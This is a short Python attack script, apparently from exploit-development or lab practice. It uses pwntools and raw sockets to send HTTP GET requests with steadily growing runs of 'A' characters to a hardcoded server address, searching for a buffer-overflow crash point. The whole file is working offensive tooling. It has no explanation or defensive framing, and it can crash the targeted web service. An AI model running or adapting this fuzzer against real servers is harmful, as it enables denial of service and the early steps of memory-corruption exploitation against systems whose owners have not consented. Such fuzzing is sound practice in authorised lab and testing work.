#!/usr/bin/env python3
import socket
import sys
import six
import time
from pwn import *

Target = '172.168.1.176'
Port = 80
timeout = 5

offset = 200
buffe = []

p1 = log.progress("Fuzzing overflow on HTTP")

p1.status("Creando Lista de Strings")
while len(buffe) < 30:
	buffe.append("A" * offset)
	offset += 200

time.sleep(1)

p1.status("Iniciando Fuzzing")

for string in buffe:
	try:
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		conexion = sock.connect((Target,Port))
		sock.settimeout(timeout)

		#log.info("conexion establecida")
		#sock.recv(1024)		

		overflow = "GET "+ string+" HTTP/1.1\r\n\r\n"

		log.info("enviando ... {} bytes".format(len(string)))
		sock.send(six.b(overflow))

		log.info("recibiendo ...")
		sock.recv(1024)

		sock.close()

	except Exception as error:
		log.failure(str(error))
		log.info("Total enviando ... {} bytes".format(len(string)))
		sys.exit(0)

	except KeyboardInterrupt:
		log.failure("Salida Forzada ....")
		log.info("Total enviando ... {} bytes".format(len(string)))
		sys.exit(0)
